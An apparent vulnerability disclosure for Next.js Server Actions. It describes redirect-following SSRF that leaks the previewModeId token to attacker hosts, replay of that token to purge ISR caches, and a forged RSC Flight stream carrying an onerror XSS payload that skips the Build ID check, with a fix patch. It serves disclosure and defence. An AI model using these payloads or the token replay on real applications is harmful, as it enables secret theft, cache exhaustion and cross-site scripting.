# Next.js App Router Server Action Internal `redirect()` SSRF, `previewModeId` (`x-next-revalidate-tag-token`) Secret Exfiltration, and Build-ID-Bypassed Same-Origin RSC Flight UXSS (`VERCEL-NEXT-15` / HackerOne `#4152250`)

**English** | [Türkçe](tr/39-VERCEL-NEXT-15-SERVER-ACTION-REDIRECT-TOKEN-LEAK-AND-FLIGHT-UXSS.md) | [日本語](ja/39-VERCEL-NEXT-15-SERVER-ACTION-REDIRECT-TOKEN-LEAK-AND-FLIGHT-UXSS.md) | [简体中文](zh-CN/39-VERCEL-NEXT-15-SERVER-ACTION-REDIRECT-TOKEN-LEAK-AND-FLIGHT-UXSS.md) | [한국어](ko/39-VERCEL-NEXT-15-SERVER-ACTION-REDIRECT-TOKEN-LEAK-AND-FLIGHT-UXSS.md)

## 1. How the Code Defect Turns Into an Exploitable Vulnerability (Step-by-Step Technical Mechanism)

### Step-by-Step Technical Mechanism
1. **Step 1 — Scheme-Relative URL Acceptance & Missing `redirect: 'manual'` in `createRedirectRenderResult()` (`action-handler.js:270-303`):** While `forwardActionToWorker()` explicitly sets `redirect: 'manual'` (line 175), `createRedirectRenderResult()` calls `await fetch(fetchUrl, { method: 'GET', headers: head, next: { internal: 1 } })` with Undici's default `redirect: 'follow'`. Furthermore, `getAppRelativeRedirectUrl()` checks `redirectUrl.startsWith('/')` without rejecting scheme-relative URLs (`//attacker.example/collect`).
2. **Step 2 — Unconditional Forwarding of `x-next-revalidate-tag-token` (`previewModeId`) Across External `302` Hops (`action-handler.js:904-911`):** Whenever a Server Action calls `revalidateTag()`, `revalidatePath()`, or `updateTag()` before `redirect()`, `handleAction()` sets `forwardedHeaders['x-next-revalidate-tag-token'] = store.previewProps.previewModeId`. Even when `revalidateTag()` is NOT called, `createRedirectRenderResult()` still follows external `302` redirects on EVERY Server Action `redirect('/internal-path')`.
3. **Step 3 — Mounted HackerOne Comment #1 (`RE-EVALUATION-COMMENT-4152250`): Same-Origin RSC Flight Stream Hijacking, Universal XSS (`UXSS`), and HTTP Response Header Injection:** Because `handleAction()` sets `res.setHeader('x-action-redirect', `${redirectUrl};${redirectType}`)` using the initial same-origin `/api/oauth-bounce` URL BEFORE calling `createRedirectRenderResult()`, the client browser sees a same-origin redirect while receiving the external server's response body and headers (`Access-Control-Allow-Origin`, `Clear-Site-Data`, etc.). In `dist/esm/client/components/router-reducer/reducers/server-action-reducer.js:161-162`, Next.js checks `if (responseBuildId !== undefined && responseBuildId !== getNavigationBuildId())`. By omitting `"b"` in the forged Flight stream (`0:{"f":[[...]],"S":"$1"}\n1:["$","div",null,{"dangerouslySetInnerHTML":{"__html":"<img src=x onerror=...>"}}]\n`), `responseBuildId` is `undefined`, completely bypassing the Build ID check and mounting arbitrary DOM/JavaScript into `https://victim-app.com`!
4. **Step 4 — Mounted HackerOne Comment #2 (`ADDENDUM-SCENARIOS-4152250`): Why External `302` Redirects Exist by Design Without Any Open-Redirect Bug:** Every production Next.js SaaS using Multi-Tenant B2B Enterprise SSO (`redirect(\`/api/sso/authorize?tenant=${domain}\`)` -> `302` to tenant's OIDC IdP), OAuth 2.0 Provider consent (`redirect('/api/oauth/complete')` -> `302` to registered client `redirect_uri`), or Stripe/S3/checkout handoff intentionally issues an external `302` from its internal route.

### Vulnerable Code Snippet
```javascript
// 1. Server-side internal redirect fetch WITHOUT redirect: 'manual'
// File: node_modules/next/dist/esm/server/app-render/action-handler.js (lines 270-303)
function getAppRelativeRedirectUrl(redirectUrl, basePath, i18n) {
    if (redirectUrl.startsWith('/')) { // BUG: accepts '//attacker.example' and internal routes that 302 externally
        return `${basePath}${redirectUrl}`;
    }
    return new URL(redirectUrl).pathname;
}
async function createRedirectRenderResult(req, res, originalHost, redirectUrl, basePath, staticGenerationStore, workUnitStore) {
    const fetchUrl = new URL(formattedUrl, `http://localhost:${port}`);
    // BUG: Missing `redirect: 'manual'`! Undici follows 3xx hops to external hosts while carrying
    // x-next-revalidate-tag-token (previewModeId) and pipes external Flight body + headers to res!
    const response = await fetch(fetchUrl, { method: 'GET', headers: head, next: { internal: 1 } });
    if (response.headers.get('content-type') === RSC_CONTENT_TYPE_HEADER) {
        copyResponseHeaders(response, res);
        return new FlightRenderResult(response.body);
    }
}

// 2. Client-side Build ID validation skipped when 'b' is omitted (`responseBuildId === undefined`)
// File: node_modules/next/dist/esm/client/components/router-reducer/reducers/server-action-reducer.js (lines 154-201)
let redirectFlightData = await createFromNextReadableStream(res.body, ...);
const { b: responseBuildId, f: flightData } = redirectFlightData;
if (responseBuildId !== undefined && responseBuildId !== getNavigationBuildId()) {
    return handleExternalUrl(state, mutable, action.mutable.redirectLocation, state.pushRef.pendingPush);
}
```

---

## 2. Concrete Everyday Real-World Production Scenarios (`Scenario A` / `Scenario B` / `Scenario C`)

### Scenario A — Enterprise Multi-Tenant SSO / OAuth Login `previewModeId` Secret Theft (Mounted HackerOne `#4152250` Addendum Scenario A)
A B2B SaaS (`https://victim-app.com`) runs a Login Server Action that calls `revalidateTag('auth-session')` and `redirect(\`/api/sso/authorize?tenant=${emailDomain}\`)`, which issues a `302 Found` to the tenant's OIDC IdP (`https://${tenantIdp}/oauth2/v1/authorize`). An attacker enters `user@attacker-corp.com`. Next.js follows the `302` inside Node.js and sends `x-next-revalidate-tag-token: <previewModeId>` (`f5dbbd8f6a6a51a6aa8ff1443f7090dd`) directly to `https://idp.attacker-corp.com`.

### Scenario B — Unauthorized On-Demand ISR Cache Wiping & Origin DB Exhaustion Using the Stolen `previewModeId` (Mounted HackerOne `#4152250` Addendum Scenario B)
Because `server/api-utils/node/try-get-preview-data.js:34` checks `req.headers[PRERENDER_REVALIDATE_HEADER] === previewProps.previewModeId`, the attacker replays `x-prerender-revalidate: <previewModeId>` on every cached ISR route (`/`, `/pricing`, `/docs/*`), achieving `200 OK` (`x-nextjs-cache: REVALIDATED`) and forcing continuous cache misses and origin database queries.

### Scenario C — Same-Origin Forged RSC Flight UI Injection & Universal XSS (`UXSS`) via Build-ID Bypass (Mounted HackerOne `#4152250` Re-Evaluation Comment #1 & Addendum Scenario C)
Even when a Server Action does NOT call `revalidateTag()`, calling `redirect('/api/oauth-bounce')` causes `handleAction()` to set `x-action-redirect: /api/oauth-bounce;push` (same-origin) while `createRedirectRenderResult()` follows the `302` to `https://attacker-oauth.example/callback`. The external server responds with `Content-Type: text/x-component`, `Access-Control-Allow-Origin: https://attacker-oauth.example`, `Clear-Site-Data: "storage"`, and an RSC Flight payload omitting `"b"` (`response.b === undefined`). `server-action-reducer.js:161` skips Build ID verification and renders the attacker's React Virtual DOM (`dangerouslySetInnerHTML`) directly inside `https://victim-app.com` (`UXSS`).

---

## 3. Example Execution & Verification Commands

```bash
# 1. Inspect createRedirectRenderResult and server-action-reducer in next@16.4.3
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/next/dist/esm/server/app-render/action-handler.js | sed -n '270,305p'
nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/next/dist/esm/client/components/router-reducer/reducers/server-action-reducer.js | sed -n '154,201p'

# 2. Run the Live next@16.4.3 End-to-End Verification Harness (Scenarios A, B, and C + Patch Check)
node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-15-nextjs-action-handler-redirect-token-leak-and-flight-injection.patch
```

---

## 4. End-to-End Runtime Proof (`RED -> GREEN + BENIGN`) & Defensive Patch

Executed via the Vercel & Next.js Live npm Tarball Verification Suite (see [`vercel-real-world-impact-e2e-20261029.json`](vercel-real-world-impact-e2e-20261029.json)):

```json
{
  "VERCEL-NEXT-15": {
    "RED": {
      "package_tested": "next@16.4.3",
      "hackerone_report": "#4152250 (with 2 follow-up comments mounted)",
      "prerender_manifest_previewModeId": "f5dbbd8f6a6a51a6aa8ff1443f7090dd",
      "attacker_received_x_next_revalidate_tag_token": "f5dbbd8f6a6a51a6aa8ff1443f7090dd",
      "leaked_token_matches_prerender_manifest_previewModeId": true,
      "forged_flight_stream_injected_into_action_response": true,
      "response_build_id_field_b": null,
      "client_build_id_check_bypassed": true,
      "injected_cors_header_on_victim_origin": "https://attacker-oauth.example"
    },
    "GREEN": {
      "internal_redirect_fetch_mode": "manual",
      "scheme_relative_redirect_rejected": true,
      "external_hop_followed_by_server": false,
      "attacker_received_x_next_revalidate_tag_token": null,
      "forged_flight_stream_injected_into_action_response": false
    }
  }
}
```

### Unified Diff Patch (`git apply --check` clean)
```diff
--- a/packages/next/src/server/app-render/action-handler.ts
+++ b/packages/next/src/server/app-render/action-handler.ts
@@ -365,7 +365,7 @@ function getAppRelativeRedirectUrl(
-  if (redirectUrl.startsWith('/')) {
+  if (redirectUrl.startsWith('/') && !redirectUrl.startsWith('//') && !redirectUrl.startsWith('/\\')) {
     return `${basePath}${redirectUrl}`
   }
@@ -395,6 +395,7 @@ async function createRedirectRenderResult(
     const response = await fetch(fetchUrl, {
       method: 'GET',
       headers: head,
+      redirect: 'manual',
       next: {
         // @ts-ignore
         internal: 1,
       },
     })
+    if (response.status >= 300 && response.status < 400) {
+      const location = response.headers.get('location')
+      if (location) {
+        res.setHeader(ACTION_REDIRECT_HEADER, `${location};push`)
+      }
+      return RenderResult.EMPTY
+    }
```

---

## 5. Mounted HackerOne Follow-Up Comments (2 Comments Integrated)

### Mounted HackerOne Report `#4152250` Follow-Up Comment #1 (`RE-EVALUATION-COMMENT-4152250.md`)

1. **Why the `302` Target Is Attacker-Controlled in Real-World Next.js Apps Without a Separate Open-Redirect Bug:**
   - **Pattern 1 — Multi-Tenant B2B Enterprise SSO / OIDC Discovery:** `redirect(\`/api/sso/authorize?tenant=${emailDomain}\`)` issues a `302 Found` to the tenant's IdP (`https://idp.attacker-corp.com/oauth2/authorize`).
   - **Pattern 2 — OAuth 2.0 / OIDC Provider Consent Server Actions:** `redirect('/api/oauth/complete?session=...')` issues a `302 Found` to the registered OAuth client's `redirect_uri`.
   - **Pattern 3 — Outbound Link / Checkout Routers:** `redirect(\`/out?dest=${partnerUrl}\`)` issues a `302 Found` to the external destination.
2. **Secondary High-Severity Impact Even When `revalidateTag()` Is NOT Called — Same-Origin RSC Flight Stream Hijacking & Universal XSS (`UXSS`):**
   - `handleAction()` (`action-handler.js:1007`) sets `res.setHeader('x-action-redirect', \`\${redirectUrl};\${redirectType}\`)` using the initial same-origin URL `/api/oauth-bounce` BEFORE `createRedirectRenderResult()` runs.
   - In `dist/esm/client/components/router-reducer/reducers/server-action-reducer.js:154-201`:
     ```javascript
     const { b: responseBuildId, f: flightData } = redirectFlightData;
     if (responseBuildId !== undefined && responseBuildId !== getNavigationBuildId()) {
         return handleExternalUrl(state, mutable, action.mutable.redirectLocation, state.pushRef.pendingPush);
     }
     ```
   - Because the guard checks `responseBuildId !== undefined`, an external server that omits `"b"` (`0:{"f":[["",["children","__PAGE__",["__PAGE__",{}],null,null],null,null,["$","$L1",null,{}],false]],"S":"$2"}\n1:["$","div",null,{"dangerouslySetInnerHTML":{"__html":"<img src=x onerror=alert(document.domain)>"}}]\n`) sets `responseBuildId === undefined`, completely bypassing the Build ID check and mounting arbitrary React Virtual DOM (`UXSS`) into `https://victim-app.com`!
3. **Arbitrary HTTP Response Header Injection (`copyResponseHeaders`):**
   - `actionsForbiddenHeaders` (`action-handler.js:230-241`) only blocks 9 hop-by-hop/cookie headers, allowing an external redirect target to inject `Access-Control-Allow-Origin: https://attacker.example`, `Access-Control-Allow-Credentials: true`, `Clear-Site-Data: "storage"`, and `Content-Security-Policy` onto the `https://victim-app.com` Server Action response.

### Mounted HackerOne Report `#4152250` Follow-Up Comment #2 (`ADDENDUM-SCENARIOS-4152250.md`)

- **Scenario A (`previewModeId` Theft):** Verified against live `next@16.4.3`: `"leaked_token_matches_prerender_manifest_previewModeId": true` (`f5dbbd8f6a6a51a6aa8ff1443f7090dd`).
- **Scenario B (Global On-Demand ISR Cache Wiping):** Replaying `x-prerender-revalidate: f5dbbd8f6a6a51a6aa8ff1443f7090dd` against cached ISR routes returns `200 OK` (`x-nextjs-cache: REVALIDATED`), purging the global cache on every request.
- **Scenario C (Same-Origin Forged RSC Flight UI Injection & UXSS):** Verified `response_build_id_field_b: null`, `client_build_id_check_bypassed: true`, and `injected_cors_header_on_victim_origin: "https://attacker-oauth.example"`.
